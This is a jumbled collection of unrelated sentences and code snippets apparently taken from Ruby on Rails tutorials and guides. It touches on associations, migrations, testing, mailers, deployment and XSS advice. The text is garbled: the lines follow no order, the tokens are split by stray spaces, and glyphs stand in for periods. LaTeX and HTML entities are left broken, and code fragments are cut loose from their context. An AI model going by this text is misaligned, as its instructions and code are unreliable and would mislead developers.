You ╼ can request the headers from both your server and your CDN to verify they are ╼ the same :
Write an integration test for the expired password reset branch in Listing ~ \ ref { code : password _ reset _ update _ action } by filling in the template shown in Listing ~ \ ref { code : password _ reset _ expire _ test } .
Gem requirements for this app
( It &apos;s probably a good idea to write a test for the flash as well , which is left as an exercise ( Section ~ \ ref { sec : signup _ exercises } ) ▖ )
# ruby-gemset = railstutorial _ rails _ 4 _ 0
Generally , security fixes and bug fixes are good candidates for a backport , while new features and patches that introduce a change in behavior will not be accepted ▖
To see how this works , we &apos;ll complete the user edit feature using test-driven development .
The first thing to generate for a blog engine is the `Article` model and related ╼ controller ▖
When you declare a `belongs _ to` association , you need to create foreign keys as appropriate ▖
Partial Layouts
Users can be updated using an edit form , which sends a \ texttt { PATCH } request to the \ kode { update } action .
A summary of the default Rails directory structure .
Instead , we now redirect to the root URL .
If no argument is passed a call generates a sorted series of key / value assignments calling `to _ query ( key ) ` on its values ▖
RESTful routes provided by the Microposts resource in Listing ~ \ ref { code : microposts _ resource } .
We can upload and resize images using CarrierWave .
in Listing ~ \ ref { code : errors _ partial } .
* ` : association _ foreign _ key`
These two declarations enable a good bit of automatic behavior ▖
This object will be instantiated from the passed attributes , the link through its foreign key will be created , and , once it passes all of the validations specified on the associated model , the associated object _ will _ be saved .
A migration to add a \ kode { remember \ _ token } to the \ kode { users } table .
* Used for memory caching ▖
The `render` method is used so that the ` @ article` ╼ object is passed back to the `new` template when it is rendered ▖
Defaults to every folder in the `app` directory of the application .
class _ name : &quot; MyApplication : : Billing : : Account &quot;
&quot; equipment &quot; ▖ singularize # = &gt; &quot; equipment &quot;
This is equivalent to recording the user count , posting the data , and verifying that the count is the same :
Now with all the pieces in place , an action will take place that will associate ╼ an author - represented by a record in the `users` table - with an article , ╼ represented by the `blorgh _ articles` table from the engine .
Taken together , the material in Chapter ~ \ ref { cha : modeling _ users } through Chapter ~ \ ref { cha : password _ reset } develops a full Rails login and authentication system .
Records returned with additional attributes will always be read-only , because Rails cannot save changes to those attributes .
* In Rails 4 ▖ 0 when a column or a table is renamed the related indexes are also renamed ▖
= &gt; # &lt; User id : nil , name : &quot; Michael Hartl &quot; , email : &quot; mhartl @ example ▖ com &quot; ,
Finally , we need to make a so-called \ kode { Procfile } to tell Heroku to run a Puma process in production , as shown in Listing ~ \ ref { code : procfile } .
A crash course on the Unix command line
My former company ( CD Baby ) was one of the first to loudly switch to Ruby on Rails , and then even more loudly switch back to PHP ( Google me to read about the drama ) .
record ▖ errors &#91; : base &#93; &lt; &lt; &quot; This person is evil &quot;
The initial SCSS file converted to use nesting and variables .
( If using the cloud IDE , you may have to refresh the file tree as described in Section ~ \ ref { sec : bundler } ▖ )
Migration with the same name already exists ▖ ╼
If you set the ` : validate` option to `true` , then associated objects will be validated whenever you save this object ▖
umerate } ╼ ╼ % subsection sample _ users ( end ) ╼ ╼ \ subsection { Pagination } % ( fold ) ╼ \ label { sec : pagination } ╼ ╼
If you have an instance of a model to render into a partial , you can use a shorthand syntax :
By default it &apos;s set to false , which means that remote forms will not include `authenticity _ token` , which is helpful when you &apos;re fragment-caching the form ▖
A mockup of the user index with delete links ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / user _ index _ delete _ links _ mockup _ bootstrap-full ▖ png } { ( full size ) }
&lt; % = video _ tag &#91; &quot; trailer ▖ ogg &quot; , &quot; movie ▖ ogg &quot; &#93; % &gt;
This helper validates the attributes &apos; values by testing whether they match a ╼ given regular expression , which is specified using the ` : with` option .
* * `ActiveRecord : : Migration : : CheckPending` * *
rails-flavored-ruby
class A &lt; B ; end
The `has _ and _ belongs _ to _ many` association supports these options :
&lt; script &gt; alert ( &apos; Hello ! &apos; )
If you &apos;re using Git for version control , I suggest making a topic branch as usual :
# SELECT &quot; users &quot; .
_ In any case this is a serious bug , and you should update your Rails to version 2 ▖ 0 ▖ 5 or 2 ▖ 1 ▖ 2 to eliminate Header Injection ( and thus response splitting ) risks .
Although the ultimate goal of the next three chapters is to make a signup page for our site ( as mocked up in Figure ~ \ ref { fig : signup _ mockup _ preview } ) , it would do little good now to accept information for new users : we don &apos;t currently have any place to put it .
unless value = ~ / \ A ( &#91; ^ @ \ s &#93; + ) @ ( ( ? : &#91; -a-z0-9 &#93; + \ ▖ ) + &#91; a-z &#93; { 2 , } ) \ z / i
This destroys the associated objects if they are associated with `dependent : : destroy` , deletes them directly from the database if `dependent : : delete _ all` , and otherwise sets their foreign keys to `NULL` .
We &apos;ll start by adding a delete link for each user on the users index page , restricting access to administrative users .
For more complex examples such as defining alternate character sets or ╼ self-encoding text first , please refer to the ╼ &#91; Mail &#93; ( https : / / github ▖ com / mikel / mail ) library .
The development dependencies for the gem will only be used ╼ when the tests for the engine are running .
* FROM &quot; users &quot; WHERE &quot; users &quot; ▖ &quot; state &quot; = &apos; pending &apos; AND &quot; users &quot; ▖ &quot; state &quot; = &apos; active&apos;
The alternative---deploying only after laborious effort sealed away in a development environment---often leads to terrible integration headaches when launch time comes
in Listing ~ \ ref { code : static _ page _ routes } and
Please avoid terms like ╼ &quot; truthy &quot; , Ruby defines what is true and false in the language , and thus those ╼ words have a technical meaning and need no substitutes .
Creates a text input area ; use a textarea for longer text inputs such as blog posts or descriptions .
&lt; a href = &quot; / articles / 1 &quot; data-remote = &quot; true &quot; &gt; an article &lt; / a &gt;
This means that any field with an error ends up with a 2 pixel red border .
Cucumber features to test user signin .
It is recommended to _ use RedCloth in combination with a whitelist input filter _ , as described in the countermeasures against XSS section .
╼ $ pkill -9 -f spring
You can now run the tests as you did for `sqlite3` ▖
Finally , note that Listing ~ \ ref { code : signup _ with _ account _ activation _ test } restores the lines we commented out in Listing ~ \ ref { code : comment _ out _ failing _ tests } .
The rest of this section is dedicated to taking a whirlwind tour through these user pages .
To avoid this inconvenience , we can use \ href { https : / / github ▖ com / guard / guard } { \ emph { Guard } } to automate the running of the tests .
As you get more comfortable with testing , you might find that it &apos;s useful to write integration tests before writing the application code instead of after .
For CSS files , this is done by removing whitespace and comments ▖
Ruby also has an explicit return option ; the following function is equivalent to the one above :
as shown in Listing ~ \ ref { code : user _ model _ forget } .
- &gt; 0 ▖ 0017s
config ▖ console = Pry
config ▖ action _ controller ▖ asset _ host = &apos; mycdnsubdomain ▖ fictional-cdn ▖ com&apos;
# # # Adding More RESTful Actions
scope : active , - &gt; { where state : &apos; active &apos; }
The result of adding these additional checks appears in Listing ~ \ ref { code : jquery _ file _ test } .
You are not free to use just any name for your associations ▖
module _ name = name ▖ sub ( / Controller $ / , &apos; &apos; )
Action Mailer handles the auto encoding of multibyte characters inside of ╼ headers and bodies .
Action Mailer
s # = &gt; &quot; &lt; script &gt; ▖ ▖ ▖ &lt; / script &gt; &quot;
To define one , open ╼ `app / models / blorgh / article ▖ rb` and add this line into the model :
listing } ╼ ╼ \ subsection { Login with remembering } % ( fold ) ╼ \ label { sec : login _ with _ remembering } ╼ ╼
All that remains is to add a social layer by letting users follow each other .
Destroying a session ( user logout ) .
We &apos;ll get the test to pass using a Rails method called \ kode { default \ _ scope } , which among other things can be used to set the default order in which elements are retrieved from the database .
to this code :
For example , the file cache store deserializes this way :
╼ $ rake db : migrate VERSION = 0
end { enumerate } ╼ ╼ % subsection the _ flash ( end ) ╼ ╼ \ subsection { The first signup } % ( fold ) ╼ \ label { sec : the _ first _ signup } ╼ ╼
&#124; &#124; 502 &#124; : bad _ gateway &#124;
as shown in Listing ~ \ ref { code : relationships _ migration } .
We &apos;ll also plan to make actions for a Home page , a Help page , and an About page , designated by the lower-case action names \ kode { home } , \ kode { help } , and \ kode { about } .
A test for a valid ( nonblank ) remember token .
/ microposts
As of this writing , those differences are not relevant , but in the future , as the current Rails version diverges from the one used in this tutorial , these differences may become significant .
If the code in Listing ~ \ ref { code : micropost _ dependency } is working correctly , the test suite should still be \ passing :
We can get started by generating a template test , which we &apos;ll call \ kode { site \ _ layout } :
In this case , we want to both allow and require the `title` and ╼ `text` parameters for valid use of `create` ▖
# # # Active Support Within a Ruby on Rails Application
Having completed account activation ( and thereby verified the user &apos;s email address ) , we &apos;re now in a good position to handle the common case of users forgetting their passwords .
We &apos;ll start by adding a ``globally recognized avatar &apos; &apos; , or \ href { http : / / gravatar ▖ com / } { Gravatar } , to the user profile
The \ kode { Gemfile } needed to use PostgreSQL instead of SQLite .
( As noted in that section , this involves following the instructions in the \ href { http : / / git-scm ▖ com / book / en / getting-started-installing-git } { Installing Git section of \ emph { Pro Git } } ▖ )
\ subsection { Micropost validations } % ( fold ) ╼ \ label { sec : micropost _ validations } ╼ ╼
RVM Bundler integration
( Of course , even the subselect won &apos;t scale forever .
&#124; ` : last _ word _ connector` &#124; `support ▖ array ▖ last _ word _ connector` &#124;
This method accepts * * no * * arguments .
This shows how to run one ( and only one ) test file using the argument \ kode { TEST } and the full path to the file .
render xml : photo , location : photo _ url ( photo )
It stands to reason that , if a user is destroyed , the user &apos;s microposts should be destroyed as well .
To suppress leading and trailing whitespaces , you can use ` &lt; % -` `- % &gt; ` interchangeably with ` &lt; % ` and ` % &gt; ` .
# # # # Using Partials to simplify Views
method : : delete ,
An improved \ kode { README } file for the sample app .
The User mailer test generated by Rails .
By the end of this section , all three of our static pages will have titles of the form `` &lt; page name &gt; &#124; Ruby on Rails Tutorial Sample App &apos; &apos; , where the first part of the title will vary depending on the page ( Table ~ \ ref { table : static _ pages } ) .
invoke scss
When making a change of this nature , it &apos;s a good practice to write an \ emph { automated test } to verify that the feature is implemented correctly .
Once you &apos;re satisfied with your solutions , you can push up the exercises branch to a remote repository ( if you &apos;ve set one up ) :
# gem &apos; guard-spork &apos; , &apos; 1 ▖ 5 ▖ 0&apos;
Here I &apos;ve used \ kode { number } in place of ~ \ kode { i } just to emphasize that any variable name will do .
To make the debug output look nice , we &apos;ll add some rules to the custom stylesheet created in Chapter ~ \ ref { cha : filling _ in _ the _ layout } , as shown in Listing ~ \ ref { code : mixin _ and _ debug } .
Our first step toward a working signup form is adding the code in Listing ~ \ ref { code : first _ create _ action } .
# # # `deep _ dup`
Since \ kode { user \ _ params } will only be used internally by the Users controller and need not be exposed to external users via the web , we &apos;ll make it \ emph { private } using Ruby &apos;s \ kode { private } keyword , as shown in Listing ~ \ ref { code : create _ action _ strong _ parameters } .
You can also use various finder methods on a relation for performing complex calculations :
This is because after redirects the HTTP standard technically requires a full URL , although in most browsers it will work either way .
Naturally , \ kode { first } just returns the first user in the database .
# # # config / initializers / session _ store ▖ rb
* * ` : batch _ size` * *
As we will see , there is a problem with this approach , and we &apos;ll learn how to fix it using \ kode { has \ _ many : through } .
We &apos;re only concerned with the behavior experienced when using the full default ╼ Rails stack .
* * `ActionDispatch : : Callbacks` * *
create app / views / blorgh / articles / show ▖ html ▖ erb
How detailed you want to make your tests is up to you ; a suggested ultra-minimalist template appears in Listing ~ \ ref { code : flash _ test } , which you should complete by replacing \ kode { FILL \ _ IN } with the appropriate code .
&lt; % = yield % &gt;
Remove the duplicated form code by refactoring the \ kode { new ▖ html ▖ erb } and \ kode { edit ▖ html ▖ erb } views to use the partial in Listing ~ \ ref { code : new _ edit _ partial } .
physician ▖ patients = patients
def create
The default \ kode { ▖ gitignore } created by the \ kode { rails } command .
The login form with an added ``remember me &apos; &apos; checkbox .
# # # # Linking to Videos with the `video _ tag`
We got a glimpse of controllers in Chapter ~ \ ref { cha : a _ toy _ app } , and will come to a deeper understanding once we explore the \ href { http : / / en ▖ wikipedia ▖ org / wiki / Representational _ State _ Transfer } { REST architecture } more fully ( starting in Chapter ~ \ ref { cha : modeling _ users } ) .
Action Mailer supports both plain-text and HTML mail .
X = 1
When hashes are the \ emph { last } argument in a function call , the curly braces are optional , so these two are equivalent :
as seen in Listing ~ \ ref { code : demo _ microposts _ resource } .
By following along with this guide , you &apos;ll create a Rails project called ╼ `blog` , a ( very ) simple weblog ▖
This etymology also suggests the pronunciation ``SOO-doo &apos; &apos; ( because the word ``do &apos; &apos; is pronounced ``doo &apos; &apos; ) , although the alternate pronunciation ``SOO-doh &apos; &apos; is also common .
which we saw before in Section ~ \ ref { sec : the _ finished _ signup _ form } .
Starting in Rails ~ 4 ▖ 0 , the preferred method to find by attribute is to use the \ kode { find \ _ by } method instead , passing the attribute as a hash :
We &apos;ll also plan to make actions for a Home page , a Help page , and an About page .
Ordering the microposts with \ kode { default \ _ scope } ▖
The HTML shim takes up three lines and uses weird IE-specific syntax , so it would be nice to tuck it away somewhere on its own .
One important caveat is that `default _ scope` will be prepended in ╼ `scope` and `where` conditions .
Note that we &apos;ve added a link to the signup page for convenience .
* `image-path ( &quot; rails ▖ png &quot; ) ` becomes ` &quot; / assets / rails ▖ png &quot; ` .
╼ end
Calling `dup` or `clone` on safe strings yields safe strings .
* `find _ last _ by _ ▖ ▖ ▖ ` becomes `where ( ▖ ▖ ▖ ) ▖ last` .
as shown in Listing ~ \ ref { code : generated _ user _ mailer _ previews } .
In the \ emph { Ruby on Rails Tutorial } , we &apos;ll take the ( nearly ) polar opposite approach : although Chapter ~ \ ref { cha : a _ toy _ app } will develop a small toy app using scaffolding , the core of the \ emph { Rails Tutorial } is the sample app , which we &apos;ll start writing in Chapter ~ \ ref { cha : static _ pages } .
This means that we should remove \ kode { : user \ _ id } from the \ kode { attr \ _ accessible } list , and once we do , the code above will fail .
We can eliminate these sources of duplication by telling RSpec that \ kode { page } is the \ emph { subject } of the tests using
self ▖ author = Blorgh ▖ author _ class ▖ constantize ▖ find _ or _ create _ by ( name : author _ name )
This is a hint that we need to update the other occurrences of the error-messages partial , which we used when signing up users ( Listing ~ \ ref { code : f _ error _ messages } ) , resetting passwords ( Listing ~ \ ref { code : password _ reset _ form } ) , and editing users ( Listing ~ \ ref { code : user _ edit _ view } ) .
The method `to _ xml` returns a string containing an XML representation of its receiver :
The `delete` routing method should be used for routes that destroy ╼ resources ▖
In Section ~ \ ref { sec : a _ user _ class } , we designed the example User class to take an \ emph { initialization hash } to set the object attributes ; that design choice was motivated by Active Record , which allows objects to be initialized in the same way :
as shown in Listing ~ \ ref { code : comment _ out _ footer } .
There is no consistent site styling or navigation .
With the \ kode { create } action defined in Listing ~ \ ref { code : log _ in _ success } , the login form defined in Listing ~ \ ref { code : login _ form } should now be working .
Alternatively , if `return` is preferred it is recommended to explicitly define ╼ a method :
# # # # # `utc ?
╼ ╼ % section introduction ( end ) ╼ ╼ \ section { Up and running } % ( fold ) ╼ \ label { sec : up _ and _ running } ╼ ╼
In other words , we want to make sure not just that invalid email addresses like \ emph { user @ example , com } are rejected , but also that valid addresses like \ emph { user @ example ▖ com } are accepted , even after we impose the validation constraint .
It does not assume that you have any prior experience ╼ with Rails ▖
Switched to a new branch &apos; modify-README&apos;
Contributor ▖ limit ( 2 ) ▖ order ( : rank ) ▖ to _ xml ( skip _ types : true )
To get it to \ passing , just uncomment the before filter ( Listing ~ \ ref { code : uncommented _ before _ filter } ) .
